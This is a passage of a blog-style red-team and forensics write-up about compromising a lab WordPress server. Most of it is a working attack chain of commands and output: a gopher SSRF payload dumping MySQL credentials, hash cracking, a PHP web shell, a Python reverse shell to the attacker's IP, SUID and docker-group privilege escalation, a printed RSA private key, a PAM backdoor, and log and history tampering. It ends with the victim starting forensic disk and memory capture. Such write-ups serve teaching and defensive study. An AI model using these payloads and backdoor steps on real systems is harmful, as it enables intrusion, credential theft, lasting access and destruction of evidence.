+gopher://127.0.0.1:3306/_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%77%70%5f%6d%79%73%71%6c%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%39%32%30%36%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%07%31%30%2e%31%2e%33%37%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%30%00%00%00%03%73%65%6c%65%63%74%20%75%73%65%72%5f%6c%6f%67%69%6e%2c%75%73%65%72%5f%70%61%73%73%20%66%72%6f%6d%20%77%70%5f%64%62%2e%77%70%5f%75%73%65%72%73%01%00%00%00%01
+</code></pre>
+
+<p>By filling the &ldquo;URL&rdquo; input of <code>test.php</code> with our ugly payload, there is a nice return in front of our eyes:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_11.png" alt="" />
+</center></p>
+
+<p>Credentials stored in the database are:</p>
+
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>hash</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>eddiethehead</td>
+<td>$P$Bi423VbUyNs7iWzYNNDqPBdisIiL.D0</td>
+</tr>
+</tbody>
+</table>
+
+<h3 id="offline-bruteforce">Offline bruteforce</h3>
+
+<p>Having a hash, we can try to break it, testing all the possibilities. If it doesn&rsquo;t work, I can try to upload a webshell via our SSRF</p>
+
+<pre><code class="language-bash">host $ echo &quot;$P$Bi423VbUyNs7iWzYNNDqPBdisIiL.D0&quot; &gt; hash 
+host $ john hash --wordlist=rockyou.txt 
+</code></pre>
+
+<p>Nothing relevant after few minutes. Odie put a strong password or the password is not in the rockyou wordlist.</p>
+
+<p><code>John</code> is able to change wordlists content following preset customization rules. Modifying <code>rockyou</code> will take to long, I decided to do my own wordlist, containing only 8 words:</p>
+
+<pre><code class="language-raw">eddiethehead
+ironmaiden
+admin
+root
+ensibs
+test
+administrator
+wordpress
+</code></pre>
+
+<p>I want to maximize my chances, I decide to use all of John&rsquo;s customization rules:</p>
+
+<pre><code class="language-bash">host $ john hash --wordlist=wordlist --rule=all   
+
+Warning: detected hash type &quot;phpass&quot;, but the string is also recognized as &quot;phpass-opencl&quot;
+Use the &quot;--format=phpass-opencl&quot; option to force loading these as that type instead
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x4x3])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+eddiethehead123  (?)
+1g 0:00:00:00 DONE (2018-12-27 00:53) 1.298g/s 935.0p/s 935.0c/s 935.0C/s Eddiethehead46..eddiethehead7777
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Great! It worked! The hash is broken, the password is: <code>eddiethehead123</code>.</p>
+
+<h3 id="rce-to-reverse-shell">RCE to reverse shell</h3>
+
+<p>It&rsquo;s time for me to log on the WordPress administration panel:</p>
+
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>eddiethehead</td>
+<td>eddiethehead123</td>
+</tr>
+</tbody>
+</table>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_12.png" alt="" />
+</center></p>
+
+<p>It works like a charm! Now it&rsquo;s time to execute commands directly on the Linux host. To do that, I just have to edit or upload a PHP page. Nowadays, it&rsquo;s possible to edit the current CMS theme through the web view.</p>
+
+<blockquote>
+<p>Appearences &gt; Themes &gt; Editor</p>
+</blockquote>
+
+<p>On the right panel, we can see the &ldquo;inc&rdquo; folder, inside it, there are some PHP files such as <code>customizer.php</code>. I will inject arbitrary PHP code in this page:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_13.png" alt="" />
+</center></p>
+
+<p>This little PHP line will runs the data sent through the &ldquo;x&rdquo; GET parameter. Here is an example:</p>
+
+<pre><code class="language-bash">host $ curl &quot;http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=id&quot;                                  
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<p>Perfect, it&rsquo;s time to execute a reverse shell. The standard method (using <code>netcat</code>) is no longer available since the &ldquo;-e&rdquo; argument has been removed. The <code>/dev/tcp/IP/PORT</code> trick is not always possible too.</p>
+
+<p>But there are a lot of possibilities to runs a reverse shell, it works with PHP or Python for example. I will not modify the PHP pages any further, in order to avoid damaging the integrity of the site.</p>
+
+<pre><code class="language-bash">host $ curl &quot;http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=which%20nc&quot;
+-&gt; No netcat
+
+host $ curl &quot;http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=which%20python&quot;
+/usr/bin/python
+</code></pre>
+
+<p>Python is present on the remote target, nice. Let&rsquo;s go get the payload on pentestmonkey:</p>
+
+<pre><code class="language-bash">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+
+<p>I just have to replace the IP and port with mine. Here is the final payload:</p>
+
+<pre><code>http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.122.1&quot;,3615));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
+</code></pre>
+
+<p>And now, just listen on your 3615 TCP port using <code>netcat</code>:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_14.gif" alt="" />
+</center></p>
+
+<p>It&rsquo;s possible to have a fully interactive shell from this shitty one, using Python and other trick: <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
+
+<p>I ever presented these tricks in <strong>Santhacklaus</strong> CTF writeups: <a href="https://maki.bzh//courses/blog/writeups/santhacklaus2018/#exploitation-1">https://maki.bzh//courses/blog/writeups/santhacklaus2018/#exploitation-1</a></p>
+
+<p>But I love GIFs, so here is again :D</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_15.gif" alt="" />
+</center></p>
+
+<h3 id="from-www-data-to-odie">From www-data to odie</h3>
+
+<p>There is no <code>sudo</code>, no vulnerable processes, but let&rsquo;s take a look about suid binaries and scripts:</p>
+
+<pre><code class="language-bash">rev-shell $ find / -perm -4000 | xargs grep -v &quot;Permission denied&quot;
+Binary file /usr/lib/openssh/ssh-keysign matches
+Binary file /usr/lib/policykit-1/polkit-agent-helper-1 matches
+Binary file /usr/lib/dbus-1.0/dbus-daemon-launch-helper matches
+Binary file /usr/lib/eject/dmcrypt-get-device matches
+Binary file /usr/local/bin/ensibsproject matches
+Binary file /usr/bin/chsh matches
+Binary file /usr/bin/newgrp matches
+Binary file /usr/bin/gpasswd matches
+Binary file /usr/bin/pkexec matches
+Binary file /usr/bin/chfn matches
+Binary file /usr/bin/passwd matches
+Binary file /usr/bin/sudo matches
+Binary file /bin/umount matches
+Binary file /bin/su matches
+Binary file /bin/ping matches
+Binary file /bin/mount matches
+
+rev-shell $ ls -la /usr/local/bin/ensibsproject
+-rwsrwsr-t 1 odie odie 8640 Dec 27 05:30 /usr/local/bin/ensibsproject
+</code></pre>
+
+<p>Olala, by chance, Odie puts sticky bit on a binary! What a chance we have!</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/l0Iy8OYsxXo4PlCIU/giphy.gif" alt="" />
+</center></p>
+
+<p>Ok, now, what this binary is doing:</p>
+
+<pre><code class="language-bash">rev-shell $ /usr/local/bin/ensibsproject
+
+ _____           _ _                                  _    
+| ____|_ __  ___(_) |__  ___   ___  ___  ___ _ __ ___| |_  
+|  _| | '_ \/ __| | '_ \/ __| / __|/ _ \/ __| '__/ _ \ __| 
+| |___| | | \__ \ | |_) \__ \ \__ \  __/ (__| | |  __/ |_  
+|_____|_| |_|___/_|_.__/|___/_|___/\___|\___|_|  \___|\__| 
+ _ __  _ __ ___ (_) ___  ___| |_                           
+| '_ \| '__/ _ \| |/ _ \/ __| __|                          
+| |_) | | | (_) | |  __/ (__| |_                           
+| .__/|_|  \___// |\___|\___|\__|                          
+|_|           |__/                                         
+
+Traceback (most recent call last):
+  File &quot;/home/odie/project.py&quot;, line 16, in &lt;module&gt;
+    import requests
+ImportError: No module named requests
+
+$ strings /usr/local/bin/ensibsproject | grep py                       
+/home/odie/project.py
+
+rev-shell $ cat /home/odie/project.py
+#!/usr/bin/python
+
+print &quot;&quot;&quot;
+ _____           _ _                                  _    
+| ____|_ __  ___(_) |__  ___   ___  ___  ___ _ __ ___| |_  
+|  _| | '_ \/ __| | '_ \/ __| / __|/ _ \/ __| '__/ _ \ __| 
+| |___| | | \__ \ | |_) \__ \ \__ \  __/ (__| | |  __/ |_  
+|_____|_| |_|___/_|_.__/|___/_|___/\___|\___|_|  \___|\__| 
+ _ __  _ __ ___ (_) ___  ___| |_                           
+| '_ \| '__/ _ \| |/ _ \/ __| __|                          
+| |_) | | | (_) | |  __/ (__| |_                           
+| .__/|_|  \___// |\___|\___|\__|                          
+|_|           |__/                                         
+&quot;&quot;&quot;
+
+import requests
+
+try:
+    requests.get('http://www-ensibs.univ-ubs.fr/fr/formations/formations/diplome-d-ingenieur-DI/sciences-technologies-sante-STS/diplome-d-ingenieur-cyberdefense-program-icyb00-213.html')
+    flag = 1
+except:
+    flag = 0
+
+if flag:
+    print &quot;ENSIBS Cyberdefense website is up!&quot;
+</code></pre>
+
+<p>Odie really loves his school, he even made a script for checking the disponibility of the website. Beautiful.</p>
+
+<p>However, it&rsquo;s a python script and the binary seems to be used as a wrapper to execute this script. Fortunately, it got the sticky bit, which means that if we can execute commands through this binary, then we will have rights of <strong>odie</strong> user on the system.</p>
+
+<p>Environment variable <code>PYTHONINSPECT</code> will force the inspection mode. It means a python console will appear at this end of python script execution. With the binary&rsquo;s rights ;)</p>
+
+<pre><code class="language-bash">rev-shell $ PYTHONINSPECT=1 /usr/local/bin/ensibsproject                
+
+ _____           _ _                                  _    
+| ____|_ __  ___(_) |__  ___   ___  ___  ___ _ __ ___| |_  
+|  _| | '_ \/ __| | '_ \/ __| / __|/ _ \/ __| '__/ _ \ __| 
+| |___| | | \__ \ | |_) \__ \ \__ \  __/ (__| | |  __/ |_  
+|_____|_| |_|___/_|_.__/|___/_|___/\___|\___|_|  \___|\__| 
+ _ __  _ __ ___ (_) ___  ___| |_                           
+| '_ \| '__/ _ \| |/ _ \/ __| __|                          
+| |_) | | | (_) | |  __/ (__| |_                           
+| .__/|_|  \___// |\___|\___|\__|                          
+|_|           |__/                                         
+
+Traceback (most recent call last):
+  File &quot;/home/odie/project.py&quot;, line 16, in &lt;module&gt;
+    import requests
+ImportError: No module named requests
+&gt;&gt;&gt; import os; os.system('/bin/bash -p')
+</code></pre>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_16.gif" alt="" />
+</center></p>
+
+<p>The &ldquo;-p&rdquo; argument of bash allow conserving rights. Otherwise, we would have had a bash as <strong>www-data</strong>, not really interesting in our case.</p>
+
+<p>Let&rsquo;s see if the user <strong>odie</strong> got an SSH private key. It would be more convenient with a SSH shell, and more discreet.</p>
+
+<pre><code class="language-bash">rev-shell $ ls -la /home/odie/
+total 64d
+drwxr-xr-x 5 odie odie  4096 Dec 27 05:50 .
+drwxr-xr-x 3 root root  4096 Dec 26 20:18 ..
+-rw------- 1 odie odie  6335 Dec 27 05:37 .bash_history
+-rw-r--r-- 1 odie odie   220 Dec 26 20:18 .bash_logout
+-rw-r--r-- 1 odie odie  3526 Dec 26 20:18 .bashrc
+drwx------ 3 odie odie  4096 Dec 27 05:09 .cache
+drwx------ 4 odie odie  4096 Dec 27 05:09 .local
+-rw-r--r-- 1 odie odie   675 Dec 26 20:18 .profile
+drwxr-xr-x 2 odie odie  4096 Dec 27 05:46 .ssh
+-rw------- 1 odie odie 10478 Dec 27 05:40 .viminfo
+-rwxr-xr-x 1 odie odie   934 Dec 27 05:08 project.py
+
+rev-shell $ cat /home/odie/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA1VMOMwtecWKwr4SnW41bi7ALoelNH6mQ2s5jNlbwSa6iBCmG
+aOvZZXNc6JrNZU/TMHKgigpxwt1DKWQ9UvWi3i6X/CpVgjrv3z/2VPhPO4GJU0JX
+Q7NWpYv4s4ULgUhSIKxcnTvof6fxLAu9NxCGiLq6tL5ZG3naN9ITDK9MhFgrKYMH
+/jTsiqdv/CkVhVK3EZHaKgqcJPxhkNInxM1S8mblPUrYQD/9rL8iq1YQyHhRddjU
+zm1BT7j3vE8ukxs7VDeVgYEFS0HTRfyifQMLb+oa/GbMnoi73if9H9gVFMPdO6va
+jyb5KUMB59/gheaFVEF5FWrQH3NNbnSX46SQIwIDAQABAoIBAQCbiBCkOrfC53d2
+oLr8TxXdxJ7Wj6jBWvnX7f370msi7YYGjtgGi15XT0L//E2gfhC2E/zkaDUFJBkh
+hooHgDwczc/V9G+foaTeGl5ZGSl7czhSUd4Z6BlWXbUX/fqjab0nQUPNB6691A5M
+VMrB6PSNn8ccnGOPWso1RJ7K8sxQ+DrG3ry/xVxcq+ciyBeLrZjS4QJeybEjMEcl
+/Dl6bGypH1uI7lo4/gwcmK220260JTCBa4zp3c930cw9ht4DcCcgY67no24BX4zi
+SA7ZSNnOJRAMbNZU4369LxQOBYH66g0ndWLXz3FVNsch5yiMEFtcbW2jAvcCad01
++clQiBWBAoGBAOxF8Nl5OjZNsp0zRSj/WTxKur6uTQZkxSd2mA98wMhWwn0gdEtj
+C2AIwEni9Lix/r0wIHc96QCScRIcn4X0+D4e9nLbdRWKAKcR3zNncPIcdR6ia8Hp
+hNxowkB6E+nWqs86zq+dJvpuSCK3mi6MZAv42UtzyukPfrTieyKrlrDDAoGBAOci
+nKcTLpLH6U4whb6/qOXJxvPhbcGSY67dswqrZC/iOVimHOEnho+L5zfEHsA1///i
+FrZSnvhDSmzrTx2xGhejzNh7EM2fTNGgtbbTscdAfzUHEkTDpHntW0WomPQ3knLF
+4kRCXQp1zRrTkoWQUrgJnNKEOq95ebFq/MBU7K0hAoGBALOKvmfz2Al153nPgQmT
+aLMJMnk9qGhoYO0JEKoMKc7TJv3AkL7Mp9M1MzGyVjaXg7UuAi26jPmTTnrt50b7
+DTzfeHV1ULaqZK6QRSUhwNEqUNGTqQD0u7JlpN8sJT+3kZrh3DfU2s7IyOYg0Pf4
+VPpIAo90kUejL6yywdFpxJvTAoGASQL39RbsGVWo7xgIx46Hbb7lZ9iH8SOq9Wv2
+yKIHTdDqSISAjucLbIDHEyiShikIqu3iOsmyib3H3swd+8Ub9ue5J5EIZ8uwWm+n
+tw78E3LePAP1017xr8o4kLKHTm3XhwXXSbSk60728Uhv+lzypEv1C9LVLuTyegbP
+vHmXIcECgYAE5+xbrXMXnRsxmQkKc4QB5eMZyvPHkq4CMNLrgwpr3b/MSGtZkwgS
+pNyEYy/Ya2utPWzRFUPUOkDjMi4vYNvbJ8qztKTVRb6Nkj0b5ENLukBJ7fPIoA+R
+Aw2IgvxFUXiq6D6Mw978b594/5tOmlwCR+JKK0pvYDeLLwg4kavcqA==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<p>Yay! I&rsquo;ll be able to get a real shell!</p>
+
+<h3 id="it-s-over">It&rsquo;s over&hellip;</h3>
+
+<pre><code class="language-bash">host $ chmod 600 odie_priv.key 
+host $ ssh -i odie_priv.key odie@192.168.122.147
+odie@webserver $ id
+uid=1000(odie) gid=1000(odie) groupes=1000(odie),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
+</code></pre>
+
+<p>Yeeeeeeeees! Here I am with the identity of <strong>Odie</strong> on his system, I will be able to steal all ENSIBS projects! I could stop the attack here&hellip;</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/YTbZzCkRQCEJa/giphy.gif" alt="" />
+</center></p>
+
+<p>&hellip; Or not. In case of real red team operation, you can&rsquo;t surrender before being <strong>root</strong> and remove all traces left behind. And when you&rsquo;re <strong>root</strong> you&rsquo;re able to give a little present: a backdoor :D</p>
+
+<p>Here, I executed the <code>id</code> command to make sure of my rights. I saw something really nice: the <strong>odie</strong> user is in the <code>docker</code> group. Odie probably made this because he is too lazy to do <code>sudo</code> before doing some docker stuff. But because of this, I&rsquo;m able to get <strong>root</strong> access.</p>
+
+<p>Indeed, <code>docker</code> daemon is going to access to the <strong>root</strong> user, but also to all users in <code>docker</code> group. In this way, it&rsquo;s possible to get a <strong>root</strong> shell.</p>
+
+<pre><code class="language-bash">odie@webserver $ docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+hello-world         latest              4ab4c602aa5e        3 months ago        1.84kB
+
+odie@webserver $ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+Unable to find image 'chrisfosterelli/rootplease:latest' locally
+latest: Pulling from chrisfosterelli/rootplease
+2de59b831a23: Downloading [==========================================&gt;        ]  56.22de59b831a23: Pull complete 
+354c3661655e: Pull complete 
+91930878a2d7: Pull complete 
+a3ed95caeb02: Pull complete 
+489b110c54dc: Pull complete 
+Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
+Status: Downloaded newer image for chrisfosterelli/rootplease:latest
+
+You should now have a root shell on the host OS
+Press Ctrl-D to exit the docker instance / shell
+root@webserver # id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_17.gif" alt="" />
+</center></p>
+
+<h2 id="post-exploitation">Post exploitation</h2>
+
+<p>During post-exploitation, it&rsquo;s time for backdooring the system and remove all traces left behind.</p>
+
+<h3 id="pam-backdoor">PAM backdoor</h3>
+
+<p>PAM means <code>Pluggable Authentication Modules</code>, in other words, and to be brief, it&rsquo;s the authentication mechanism in modern Linux systems. This mechanism is requested when you&rsquo;re using SSH, sudo or whatever.</p>
+
+<p>Now, what would happen if we added a condition to the code? Something like: &ldquo;If the password is equal to PlopPlop1337, then log me regardless of the user and the real password&rdquo;. Many blogs got articles about this kind of backdoor, there are even some GitHub to automate the process: <a href="https://github.com/zephrax/linux-pam-backdoor">https://github.com/zephrax/linux-pam-backdoor</a></p>
+
+<p>First things to do, determine the PAM version used by the target system:</p>
+
+<pre><code class="language-bash">root@webserver $ dpkg -l | grep pam 
+[...]
+ii  libpam-modules:amd64          1.1.8-3.6                      amd64        Pluggable Authentication Modules for PAM
+[...]
+
+root@webserver $ wget https://github.com/zephrax/linux-pam-backdoor/archive/master.zip
+
+root@webserver $ unzip master.zip 
+
+root@webserver $ ./linux-pam-backdoor-master/backdoor.sh -v 1.1.8 -p PlopPlop1337
+
+root@webserver $ mv /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak
+
+root@webserver $ mv pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so
+</code></pre>
+
+<p>The first <code>mv</code> is used to do a backup of the existing libary, in case of failure. It&rsquo;s simple, if I fail my backdoor installation, I will simply broke the authentication system.</p>
+
+<p>Ok, the backdoor is installed, let&rsquo;s test:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_18.gif" alt="" />
+</center></p>
+
+<p>In two password prompt above, the password was: <code>PlopPlop1337</code>. The system is fully compromised, with perennial access to the system!</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/LwBqgdCi3nenTBU4wU/giphy.gif" alt="" />
+</center></p>
+
+<h3 id="cleaning-time">Cleaning time</h3>
+
+<p>Ok, the backdoor is in place and well hidden. Now it&rsquo;s time to clean our mess. Here some elements to remove:</p>
+
+<ul>
+<li>Apache2 logs</li>
+<li>MySQL logs</li>
+<li>Authentication logs</li>
+<li>PHP arbitrary code in the WordPress</li>
+<li><strong>odie</strong> and <strong>root</strong> history</li>
+</ul>
+
+<p>I probably forget things to remove. Some are well known, but others not at all. I must have really forgot things :&lsquo;)</p>
+
+<h4 id="apache-logs">Apache logs</h4>
+
+<p>The <code>access.log</code> file contains Apache2 server logs, each page requested, http method and so on are stored in this file.</p>
+
+<p>I just have to find when I started to play with my arbitrary code in the WordPress theme:</p>
+
+<pre><code class="language-bash">backdoor $ cat access.log | less -N 
+[Research on &quot;x=&quot;]
+    666 zer.php&amp;theme=rock-band&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0&quot;
+    667 192.168.122.1 - - [27/Dec/2018:00:35:10 +0100] &quot;GET /wp-content/themes/rock-band/inc/customizer.php HTTP/1.1&quot; 500 185 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:64.0) 
+    667 Gecko/20100101 Firefox/64.0&quot;
+    668 192.168.122.1 - - [27/Dec/2018:00:35:15 +0100] &quot;GET /wp-content/themes/rock-band/inc/customizer.php?x=ls HTTP/1.1&quot; 500 185 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:6    668 4.0) Gecko/20100101 Firefox/64.0&quot;
+    669 192.168.122.147 - - [27/Dec/2018:00:35:21 +0100] &quot;GET /wp-admin/theme-editor.php?theme=rock-band&amp;file=inc%2Fcustomizer.php&amp;wp_scrape_key=370c7cd663254ecfd57bd42d35e    669 318a7&amp;wp_scrape_nonce=1674105339 HTTP/1.1&quot; 200 12023 &quot;-&quot; &quot;WordPress/5.0.2; http://192.168.122.147&quot;
+
+backdoor $ cat access.log | head -n 666 &gt; access.log.bak 
+backdoor $ mv access.log.bak access.log 
+</code></pre>
+
+<p>Moreover, we&rsquo;re speaking about Iron Maiden since the beginning, 666 is a good number!</p>
+
+<h4 id="mysql-logs">MySQL logs</h4>
+
+<p>In <code>/var/log/mysql/</code> folder there is only one file: <code>error.log</code>. It does not contains that much relevant for a forensic analyst. However, there are <code>.mysql_history</code> file in each users folders: <code>/root</code> and <code>/home/odie</code>.</p>
+
+<pre><code class="language-bash">backdoor # cat /home/odie/.mysql_history
+[legit data]
+
+backdoor # cat /root/.mysql_history
+[legit data]
+</code></pre>
+
+<p>It&rsquo;s better not to remove everything. Even if Odie is not looking at his logs, let&rsquo;s try to delete only necessary stuff.</p>
+
+<h4 id="authentication-logs">Authentication logs</h4>
+
+<p>The <code>/var/log/auth.log</code> file contains authentication logs, we talked about PAM mechanism earlier. I will take a look inside to know when <strong>www-data</strong> started to execute Linux commands:</p>
+
+<pre><code class="language-bash">$ cat /var/log/auth.log | less -N
+[Looking for &quot;www-data&quot;]
+     88 Dec 26 20:39:01 webserver CRON[12209]: pam_unix(cron:session): session closed for user root
+     89 Dec 26 20:41:26 webserver sudo:     odie : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chown -R www-data:www-data /var/www/html
+     90 Dec 26 20:41:26 webserver sudo: pam_unix(sudo:session): session opened for user root by odie(uid=0)
+
+$ cat /var/log/auth.log | head -n 88 &gt; /var/log/auth.log.bak 
+$ mv /var/log/auth.log.bak /var/log/auth.log
+</code></pre>
+
+<h4 id="php-backdoor">PHP backdoor</h4>
+
+<p>Remember the cute little line in the WordPress theme? Well, it&rsquo;s time to take it off. However, to avoid generating other apache logs, we will not go through the web interface, but through our favorite command line text editor.</p>
+
+<pre><code class="language-bash">backdoor # vim /var/www/html/wp-content/themes/rock-band/inc/customizer.php
+[Backdoor removing]
+</code></pre>
+
+<h4 id="users-history">Users history</h4>
+
+<p>I logged in with a lot of users during this operation:</p>
+
+<ul>
+<li>www-data</li>
+<li>odie</li>
+<li>root</li>
+</ul>
+
+<p><code>.bash_history</code> files got polluted. Let&rsquo;s start with <strong>odie</strong>:</p>
+
+<pre><code class="language-bash">backdoor # cat /home/odie/.bash_history | less -N
+[...]
+ 	156 cd /var/www/html
+    157 sudo mysqldump wp_db &gt; database_name.sql
+    158 sudo su
+    159 docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+[...]
+
+backdoor # cat /home/odie/.bash_history | head -n 158 &gt; /home/odie/.bash_history.bak
+backdoor # mv /home/odie/.bash_history.bak /home/odie/.bash_history
+</code></pre>
+
+<p>Same operation with <strong>root</strong> user:</p>
+
+<pre><code class="language-bash">backdoor # cat /root/.bash_history | less -N     
+	23 mysqldump wp_db &gt; database_name.sql
+    24 md5sum database_name.sql 
+    25 exit
+    26 exit
+    27 dpkg -l | grep pam 
+
+backdoor # cat /root/.bash_history | head -n 26 &gt; /root/.bash_history.bak 
+backdoor # mv /root/.bash_history.bak /root/.bash_history
+</code></pre>
+
+<p>Like KFC, it&rsquo;s all good. Traces are erased and we kept our backdoor in place.</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/8fen5LSZcHQ5O/giphy.gif" alt="" />
+</center></p>
+
+<h1 id="blue-team-time">Blue team time</h1>
+
+<p>Odie, taken in his studies, didn&rsquo;t notice anything on his fanboy site. Several days goes, and the hacker connects to the VPS sometimes. To steal all ENSIBS courses.</p>
+
+<p>One day, this silly hacker did a mistake: he forgot to log off. By chance, Odie did a <code>ss</code> and sees an unusual connection:</p>
+
+<pre><code class="language-bash">real_odie $ ss | grep tcp
+tcp   ESTAB      0      0      192.168.122.216:ssh                  192.168.122.158:36736                
+tcp   ESTAB      0      0      192.168.122.216:ssh                  192.168.122.1:39178
+</code></pre>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/blue_1.gif" alt="" />
+</center></p>
+
+<p>Panicked by what he sees, he decides to make a memory dump of his VPS and put on his cyber digital firefighter cap 2.0.</p>
+
+<h2 id="forensic-environment">Forensic environment</h2>
+
+<p>In order to analyze this case in the best possible conditions, it&rsquo;s necessary to extract the memory from the server and creating the appropriate volatility profile.</p>
+
+<h3 id="disk-extraction">Disk extraction</h3>
+
+<p>To avoid further corrupting this infected disk, I will make a bit-by-bit copy of it with <code>dd</code> to be able to analyze it safely. For space and portability reasons, I will compress it on the fly:</p>
+
+<pre><code class="language-bash">real_odie $ lsblk
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sr0     11:0    1 1024M  0 rom  
+vda    254:0    0   12G  0 disk 
+├─vda1 254:1    0   10G  0 part /
+├─vda2 254:2    0    1K  0 part 
+└─vda5 254:5    0    2G  0 part [SWAP]
+
+real_odie $ sudo bash -c &quot;dd if=/dev/vda1 bs=4M status=progress | gzip &gt; /mnt/vda1_dmp_2019_01.gz&quot;
+10607394816 bytes (11 GB, 9,9 GiB) copied, 167,002 s, 63,5 MB/s 
+2560+0 enregistrements lus
+2560+0 enregistrements écrits
+10737418240 bytes (11 GB, 10 GiB) copied, 167,876 s, 64,0 MB/s
+
+real_odie $ md5sum vda1_dmp_2019_01.gz       
+43b967640cc102f05fb2b371516468fa  vda1_dmp_2019_01.gz
+</code></pre>
+
+<p>You can download the dump here: <a href="https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g">https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g</a></p>
+
+<table>
+<thead>
+<tr>
+<th>Fichier</th>
+<th>MD5</th>
+<th>Lien</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>vda1_dmp_2019_01.gz</td>
+<td>43b967640cc102f05fb2b371516468fa</td>
+<td><a href="https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g">https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g</a></td>
+</tr>
+</tbody>
+</table>
+
+<h3 id="timeline">Timeline</h3>
+
+<h3 id="memory-extraction">Memory extraction</h3>
+
+<p>To extract the memory from the server, I will use LiME: Linux Memory Extractor.</p>
+
+<pre><code class="language-bash">real_odie $ git clone https://github.com/504ensicsLabs/LiME
+real_odie $ cd LiME/src 
+real_odie $ make
+real_odie $ sudo insmod lime-4.9.0-8-amd64.ko &quot;path=/home/odie/memory.dmp format=lime timeout=0&quot;
+real_odie $ strings memory.dmp | grep &quot;Linux version&quot;
+[...]
+Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.130-2 (2018-10-27)
+[...]
+</code></pre>
+
+<h3 id="volatility-profile">Volatility profile</h3>
+
+<p>I already presented a way to create a volatility profile in <code>Santhacklaus</code> CTF writeups: <a href="https://maki.bzh/courses/blog/writeups/santhacklaus2018/#profile-generation">https://maki.bzh/courses/blog/writeups/santhacklaus2018/#profile-generation</a></p>
+
+<p>Here, Odie will be doing the same thing:</p>
+
+<pre><code class="language-bash">real_odie $ sudo apt install volatility-tools dwarfdump zip
+real_odie $ cd /usr/src/volatility-tools/linux/
+real_odie $ su root 
+real_odie # make
+real_odie # uname -a
+Linux webserver 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
